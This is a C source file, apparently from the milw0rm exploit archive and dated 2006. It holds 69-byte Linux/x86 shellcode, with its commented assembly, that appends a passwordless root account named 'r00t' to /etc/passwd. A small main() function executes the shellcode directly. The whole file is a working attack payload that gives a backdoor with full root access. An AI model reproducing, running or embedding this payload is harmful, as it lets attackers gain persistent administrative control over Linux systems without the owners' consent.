/* By Kris Katterjohn 11/14/2006
 *
 * 69 byte shellcode to add root user 'r00t' with no password to /etc/passwd
 *
 * for Linux/x86
 *
 *
 *
 * section .text
 *
 *      global _start
 *
 * _start:
 *
 * ; open("/etc//passwd", O_WRONLY | O_APPEND)
 *
 *      push byte 5
 *      pop eax
 *      xor ecx, ecx
 *      push ecx
 *      push 0x64777373
 *      push 0x61702f2f
 *      push 0x6374652f
 *      mov ebx, esp
 *      mov cx, 02001Q
 *      int 0x80
 *
 *      mov ebx, eax
 *
 * ; write(ebx, "r00t::0:0:::", 12)
 *
 *      push byte 4
 *      pop eax
 *      xor edx, edx
 *      push edx
 *      push 0x3a3a3a30
 *      push 0x3a303a3a
 *      push 0x74303072
 *      mov ecx, esp
 *      push byte 12
 *      pop edx
 *      int 0x80
 *
 * ; close(ebx)
 *
 *      push byte 6
 *      pop eax
 *      int 0x80
 *
 * ; exit()
 *
 *      push byte 1
 *      pop eax
 *      int 0x80
 */

main()
{
       char shellcode[] =
               "\x6a\x05\x58\x31\xc9\x51\x68\x73\x73\x77\x64\x68"
               "\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe3\x66"
               "\xb9\x01\x04\xcd\x80\x89\xc3\x6a\x04\x58\x31\xd2"
               "\x52\x68\x30\x3a\x3a\x3a\x68\x3a\x3a\x30\x3a\x68"
               "\x72\x30\x30\x74\x89\xe1\x6a\x0c\x5a\xcd\x80\x6a"
               "\x06\x58\xcd\x80\x6a\x01\x58\xcd\x80";

       (*(void (*)()) shellcode)();
}

// milw0rm.com [2006-11-17]